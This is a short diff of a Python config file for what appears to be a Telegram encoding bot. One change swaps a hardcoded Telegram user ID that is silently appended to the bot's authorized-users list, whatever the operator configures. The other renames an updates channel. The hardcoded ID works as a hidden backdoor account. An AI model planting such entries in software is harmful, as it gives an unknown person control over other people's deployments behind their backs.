@@ -22,7 +22,7 @@ from bot.config import Config
 # dont think ne dumb (c) @Animes_Encoded 
 AUTH_USERS = set(Config.AUTH_USERS)
 AUTH_USERS = list(AUTH_USERS)
-AUTH_USERS.append(1666551439)
+AUTH_USERS.append(5179011789)
 # again lol (c) @Animes_Encoded 
 
 SESSION_NAME = Config.SESSION_NAME
@@ -39,7 +39,7 @@ UN_FINISHED_PROGRESS_STR = "▢"
 BOT_START_TIME = time.time()
 LOG_FILE_ZZGEVC = "Log.txt"
 BOT_USERNAME = Config.BOT_USERNAME 
-UPDATES_CHANNEL = "botlogas"
+UPDATES_CHANNEL = "cmd_rulf"
 data = []
 crf = []
 watermark = []
